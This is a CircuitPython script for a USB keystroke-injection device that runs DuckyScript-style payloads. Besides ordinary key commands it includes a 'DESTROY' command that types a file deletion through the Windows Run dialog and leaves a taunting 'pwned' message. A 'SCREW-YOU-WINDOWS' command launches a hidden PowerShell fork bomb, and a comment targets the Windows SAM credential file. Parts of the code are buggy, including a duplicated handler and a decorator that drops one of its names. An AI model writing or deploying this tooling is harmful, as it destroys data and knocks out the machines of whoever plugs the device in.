import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

from adafruit_hid.consumer_control import ConsumerControl
from adafruit_hid.consumer_control_code import ConsumerControlCode
#WinOS is funny hehehe

#new tab download file?????

#mess with later: C:\Windows\System32\config\SAM

time.sleep(1)

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)


COMMANDS = {}


def command(name):
    def wrapper(fn):
        COMMANDS[name] = fn
        return fn
    return wrapper

@command("STRING")
def cmd_string(args):
    layout.write(args)

@command("DELAY")
def cmd_delay(args):
    time.sleep(int(args) / 1000)

def execute_line(line):
    cmd, *rest = line.split(" ", 1)
    if cmd in COMMANDS:
        COMMANDS[cmd](rest[0] if rest else "")

KEYS = {k: getattr(Keycode, k) for k in dir(Keycode) if k.isupper()}
KEYS["CTRL"] = Keycode.CONTROL
KEYS["ESC"] = Keycode.ESCAPE
KEYS["GUI"] = Keycode.GUI
KEYS["WINDOWS"] = Keycode.GUI
KEYS["VOLUMEUP"] = Keycode.F11
#yes yes ik ik two things are set to the same thing, im kinda slow sometimes

@command("PRESS")
def cmd_press(args):
    keys = [KEYS[key.upper()] for key in args.split()]
    for k in keys:
        kbd.press(k)
    for k in reversed(keys):
        kbd.release(k)

vars = {}

def replace_vars(text):
    for k, v in vars.items():
        text = text.replace(k, str(v))
    return text

@command("VAR")
def cmd_var(args):
    name, value = args.split("=")
    vars[name.strip()] = int(value.strip())

def eval_expr(expr):
    return eval(expr, {}, vars)

default_delay = 10
line_bef = ""

@command("DEFAULT_DELAY")
def cmd_default_delay(args):
    global default_delay
    default_delay = int(args)

@command("REPEAT")
def cmd_repeat(args):
    for _ in range(int(args)):
        execute_line(line_bef)


@command("GUI" or "WINDOWS")
def cmd_gui(args):
    kbd.press(Keycode.GUI)
    keys = [KEYS.get(k.upper(), getattr(Keycode, k.upper(), None)) 
            for k in args.split()]
    for k in keys:
        if k: kbd.press(k)
    time.sleep(0.002)
    for k in keys:
        if k: kbd.release(k)
    kbd.press(Keycode.GUI)


@command("ENTER")
def cmd_enter(args):
    kbd.press(Keycode.ENTER)
    kbd.release(Keycode.ENTER)

@command("ESC")
def cmd_enter(args):
    kbd.press(Keycode.ESCAPE)
    kbd.release(Keycode.ESCAPE)

@command("WAIT")
def cmd_wait(args):
    time.sleep(60)

#NEVER USE UNLESS REALLY NEEDED!!!!!
#WARNING: DANGEROUS
@command("DESTROY")
def cmd_dest(args):
    cmd_gui('r')
    cmd_string('r')
    layout.write(f"rm {args}")
    cmd_enter()
    layout.write("New-Item -ItemType File you_have_a_new_message.txt ; \"YOU'VE BEEN PWNED, BITCH!!!\" >> you_have_a_new_message.txt")
    cmd_enter()


@command("SCREW-YOU-WINDOWS")
def cmd_screw(args):
    cmd_gui('r')
    time.sleep(0.01)
    cmd_string('r')
    time.sleep(0.2)
    layout.write('powershell -WindowStyle Hidden -Command "function screw { Start-Job -ScriptBlock ${function:screw}; & screw }; screw"')
    time.sleep(0.2)
    cmd_enter()


@command("VOLUME_UP")
def cmd_vol(args):
    comms = ConsumerControl(usb_hid.devices)
    for _ in range(40):
        comms.send(ConsumerControlCode.VOLUME_INCREMENT)

@command("EMAIL")
def cmd_mail(args):
    cmd_gui('r')
    kbd.invoke('')

try:
    with open("payload.dd") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("REM"):
                execute_line(line)
                if default_delay > 0:
                    time.sleep(default_delay/1000)
                line_bef = line
except Exception as e:
    pass
